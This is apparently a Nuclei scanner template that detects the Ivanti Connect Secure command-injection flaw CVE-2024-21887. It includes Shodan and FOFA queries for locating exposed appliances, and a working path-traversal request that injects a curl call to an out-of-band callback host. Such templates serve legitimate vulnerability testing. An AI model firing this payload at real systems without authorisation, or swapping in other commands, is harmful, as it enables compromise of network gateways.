id: CVE-2024-21887

info:
  name: Ivanti Connect Secure (9.x, 22.x) and Ivanti Policy Secure (9.x, 22.x) - Command Injection
  author: pdresearch,parthmalhotra,iamnoooob
  severity: critical
  description: A command injection vulnerability in web components of Ivanti Connect Secure (9.x, 22.x) and Ivanti Policy Secure (9.x, 22.x)  allows an authenticated administrator to send specially crafted requests and execute arbitrary commands on the appliance.
  reference:
    - https://forums.ivanti.com/s/article/CVE-2023-46805-Authentication-Bypass-CVE-2024-21887-Command-Injection-for-Ivanti-Connect-Secure-and-Ivanti-Policy-Secure-Gateways?language=en_US
    - http://packetstormsecurity.com/files/176668/Ivanti-Connect-Secure-Unauthenticated-Remote-Code-Execution.html
    - https://github.com/farukokutan/Threat-Intelligence-Research-Reports
    - https://github.com/lions2012/Penetration_Testing_POC
    - https://github.com/Chocapikk/CVE-2024-21887
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:C/C:H/I:H/A:H
    cvss-score: 9.1
    cve-id: CVE-2024-21887
    cwe-id: CWE-77
    epss-score: 0.94395
    epss-percentile: 0.99969
    cpe: cpe:2.3:a:ivanti:connect_secure:9.0:*:*:*:*:*:*:*
  metadata:
    max-request: 1
    vendor: ivanti
    product: connect_secure
    shodan-query:
      - "html:\"welcome.cgi?p=logo\""
      - http.title:"ivanti connect secure"
      - http.html:"welcome.cgi?p=logo"
    fofa-query:
      - body="welcome.cgi?p=logo"
      - title="ivanti connect secure"
    google-query: intitle:"ivanti connect secure"
  tags: packetstorm,cve,cve2024,kev,rce,ivanti,vkev,vuln

http:
  - raw:
      - |
        GET /api/v1/totp/user-backup-code/../../license/keys-status/%3bcurl%20{{interactsh-url}} HTTP/1.1
        Host: {{Hostname}}

    matchers-condition: and
    matchers:
      - type: word
        part: interactsh_protocol
        words:
          - "http"

      - type: word
        part: header
        words:
          - 'application/json'

      - type: word
        part: body
        words:
          - '"result":'
          - '"message":'
        condition: and
# digest: 4a0a00473045022100e5f6a6649a7a6e2241fd08e0e7533d3044d7dd5f8ba1a86cfe2767575e21dbc60220719e08bf3c5d9d0eea9cc4d1da9e4c659a83fb0e9801f10836bf9c7e23fbc829:922c64590222798bb761d5b6d8e72950